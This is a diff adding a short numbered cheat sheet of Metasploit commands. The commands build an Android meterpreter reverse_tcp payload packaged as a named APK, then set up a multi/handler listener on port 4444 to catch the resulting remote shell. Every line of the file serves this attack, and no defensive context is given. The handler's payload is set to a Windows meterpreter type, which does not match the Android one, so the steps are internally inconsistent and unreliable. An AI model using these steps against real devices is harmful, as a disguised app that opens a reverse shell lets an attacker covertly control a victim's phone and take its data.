@@ -1,0 +1,8 @@
+1.msfvenom -p android/meterpreter/reverse_tcp LHOST='ipconfig' LPORT=4444 R> 'app name'.apk
+2.msfconsole
+3.use exploit/multi/handler
+4.set payload windows/meterpreter/reverse_tcp
+5.set lhost 10.0.2.15
+6.set lport 4444
+7.exploit
+8.help
